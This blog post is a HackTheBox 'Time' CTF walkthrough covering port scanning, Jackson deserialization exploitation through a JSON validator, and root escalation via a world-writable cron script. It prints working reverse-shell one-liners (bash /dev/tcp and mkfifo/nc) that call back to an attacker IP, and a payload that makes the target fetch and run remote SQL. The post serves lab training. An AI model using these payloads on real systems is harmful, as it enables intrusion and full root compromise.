<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Time HackTheBox Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/time-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2021-05-25T14:08:37+00:00">May 25, 2021</time><time class="updated" datetime="2025-06-20T17:48:12+00:00">June 20, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello! Everyone and Welcome to yet another CTF challenge from Hack the Box, called ‘Time,’ which is available online for those who want to increase their skills in penetration testing and Black box testing. The challenge was designed by egotisticalSW &amp; felamos.</span></p>
<p><span style="color: #000000;"><strong>Level:</strong> Medium</span></p>
<p><span style="color: #000000;"><strong>Task:</strong> Find user.txt and root.txt in the victim’s machine</span></p>
<h3><span style="color: #800000;"><strong>Penetration Methodologies</strong></span></h3>
<p><span style="color: #000000;"><strong>Scanning</strong></span></p>
<ul>
<li><span style="color: #000000;">Nmap</span></li>
</ul>
<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
<ul>
<li><span style="color: #000000;"> Browsing HTTP service  </span></li>
<li><span style="color: #000000;">Enumerating Json beautifier and validator</span></li>
</ul>
<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
<ul>
<li><span style="color: #000000;"> Exploiting com.fasterxml.jackson.core  </span></li>
<li><span style="color: #000000;"> Linpeas to search for possible paths to escalate privileges</span></li>
</ul>
<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
<ul>
<li><span style="color: #000000;"> Uploading reverse shell in timer_backup.sh</span></li>
</ul>
<p><span style="color: #000000;"><strong>Capturing the flag</strong></span></p>
<p><span style="color: #000000;"><strong>Walkthrough</strong></span></p>
<h3><span style="color: #800000;">Network Scanning</span></h3>
<p><span style="color: #000000;">Let’s get started then!</span></p>
<p><span style="color: #000000;">To Attack any machine, we need the IP Address. Machine hosted on HackTheBox have a static IP Address.</span></p>
<p><span style="color: #000000;">IP Address assigned to Time machine: <strong>10.129.148.206</strong></span></p>
<p><span style="color: #000000;">Let us scan the VM with the most popular port scanning tool, nmap to enumerate open ports on the machine</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -A 10.129.148.206</pre>
<p><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-81VAj-px8ds/YK0Bz5URFMI/AAAAAAAAwNA/lYcF3xPGYGo9oBli58oIeZxs2vRVkkiLgCLcBGAsYHQ/s16000/1.png"/></strong></span></p>
<p><span style="color: #000000;">From the result above we found two working ports on the VM, ports that ran services such as SSH(22), HTTP(80). Since we don’t have the credentials for the SSH so we cannot enumerate it. The only service that is left is the HTTP service.</span></p>
<h3><span style="color: #800000;">Enumeration</span></h3>
<p><span style="color: #000000;">Starting with the HTTP service, we try to enumerate by accessing the IP Address of the target machine on a Web Browser. We see a website that features online Json beautifier and validator.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7PwHnxoqZXE/YK0CUbwLNAI/AAAAAAAAwNI/LPKS1FZ_RxYat9COa8_JGcSU55Gb73TiQCLcBGAsYHQ/s16000/2.png"/></span></p>
<p><span style="color: #000000;">We put something simple in beautifier to test and we received a message saying “null”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-fToMOCu-tPA/YK0CXXoga-I/AAAAAAAAwNM/HunXKvRpWiwLohSTJ-C5z5pXKJGD_d0IACLcBGAsYHQ/s16000/3.1.png"/></span></p>
<p><span style="color: #000000;">So, we checked dropdown and there we saw the validator function which is in beta and while giving an input we received an error related to com.fasterxml.jackson.core.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-vtKKXgJafLI/YK0CgR2zJEI/AAAAAAAAwNQ/AnWtoEkPn9QUb9B2reEquxU4LtJp6iTxACLcBGAsYHQ/s16000/3.3.png"/></span></p>
<p><span style="color: #000000;">Next, we did some research and on google, we found a script that can be used to exploit com.fasterxml.jackson.core and is available on the github repository.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">https://github.com/jas502n/CVE-2019-12384</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TyDnDMCbcEk/YK0Cw1ykN1I/AAAAAAAAwNg/dpbr0sx2oBAHxrG53sG8DWrqu2W5OaczACLcBGAsYHQ/s16000/3.png"/></span></p>
<p><span style="color: #000000;">As you can see in the image below, we cloned the repository to our local machine and to get reverse shell we need to edit the last line of the code in inject.sql file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">git clone https://github.com/jas502n/CVE-2019-12384.git
cd CVE-2019-12384
ls
cat inject.sql</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wnZ3mSaHrAs/YK0C0tH8lxI/AAAAAAAAwNk/VSVsvoRV15oZDmyWiaEbsB7HO8wMn1UmQCLcBGAsYHQ/s16000/4.png"/></span></p>
<h3><span style="color: #800000;"><strong>Exploitation</strong></span></h3>
<p><span style="color: #000000;">We created a simple bash reverse shell script and added to our inject.sql file.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">bash -i &gt;&amp; /dev/tcp/10.10.14.108/1234 0&gt;&amp;1</pre>
<p><span style="color: #000000;">Then, we start python one-liner SimpleHttpServer in our local machine to transfer the file from our machine to the victim machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-WzGWrfT0fbU/YK0C5VXmR4I/AAAAAAAAwNo/FzUPkpEyWrYDF9KT8mBND3DSerzUsoJqACLcBGAsYHQ/s16000/5.png"/></span></p>
<p><span style="color: #000000;">We went to the function validate beta and entered the following payload which we got from the git repository into the input field and then clicked process.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">["ch.qos.logback.core.db.DriverManagerConnectionSource", {"url":"jdbc:h2:mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM 'http://10.10.14.108:8000/inject.sql'"}]</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-S5SHkMuqzlo/YK0C8qkRbGI/AAAAAAAAwNs/OWhb5at2v7MC-NtCRTfbYs5m9U5WwzmWwCLcBGAsYHQ/s16000/6.png"/></span></p>
<p><span style="color: #000000;">Next, we started netcat listener on port 1234 in another terminal which gave us a reverse shell of the user pericles.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 1234
cd /home
ls
cd /pericles
ls
cat user.txt</pre>
<p><span style="color: #000000;">So, to exploit further to get root shell, we uploaded linpeas from local machine to victim machine. The script will look for possible paths to escalate privileges.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">cd /tmp
wget 10.10.14.108:8000/linpeas.sh
chmod 777 linpeas.sh
./linpeas.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-PU0WuhXVya8/YK0DC-vvH2I/AAAAAAAAwNw/avdUERTu-RQBkyn1KWakQldhum4ZwH8owCLcBGAsYHQ/s16000/7.png"/></span></p>
<h3><span style="color: #000000;"><strong><span style="color: #800000;">Privilege Escalation</span> </strong></span></h3>
<p><span style="color: #000000;">The result below from linpeas tell us that linpeas found a script timer_backup.sh which is present in /usr/bin directory and is writable by normal users.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-f59XPxritQc/YK0DImGOwBI/AAAAAAAAwN4/82EOUMt240AdtcrTGaM8VQjNWKnsjrpHACLcBGAsYHQ/s16000/8.png"/></span></p>
<p><span style="color: #000000;">So, we quickly checked the timer_backup.sh, which we found to be readable, writable, and executable, but when we tried to execute the script, it gave us an error. So, it means that only the root user can execute the file, and everything we add to the script will get executed with root privilege.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_hmLZQgF7IQ/YK0DPUVI_pI/AAAAAAAAwOA/gKCNQGBaSUEuR97RAusqqmg4uyjEZCt5wCLcBGAsYHQ/s16000/9.png"/></span></p>
<p><span style="color: #000000;">We added our reverse shell payload inside the timer_backup.sh file which gets executed by root privilege.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo  "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.108 4444 &gt;/tmp/f" &gt;&gt; /usr/bin/timer_backup.sh</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-willPFzVkFo/YK0DU9LmEGI/AAAAAAAAwOI/8sdQPlCN3kcPOmVIvku93HbLgGg5JVWRwCLcBGAsYHQ/s16000/10.png"/></span></p>
<h3><span style="color: #000000;"><strong>Getting root shell</strong></span></h3>
<p><span style="color: #000000;">We started netcat listener in one window of the local machine. </span><span style="color: #000000;">Since the script is executed by root every 5-10 seconds so next time it executed, we will get the shell.</span></p>
<p><span style="color: #000000;">So here the privilege escalation is due to the unwanted file permission given to the normal user.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nc -lvp 4444
cat /root/root.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7SKiyXbPGnY/YK0DaAgZ34I/AAAAAAAAwOQ/yzvt4gaJ7Y0Qout3scx8E7_hBOVVsqZLwCLcBGAsYHQ/s16000/11.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. I hope you have enjoyed and learned something new today. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author: Prabhjot Dunglay</strong> is a Cyber Security Enthusiast with 2 years of experience in Penetration Testing at Hacking Articles, Ignite technologies. Contact <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/prabhjotdunglay">here</a></strong></span>.</span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
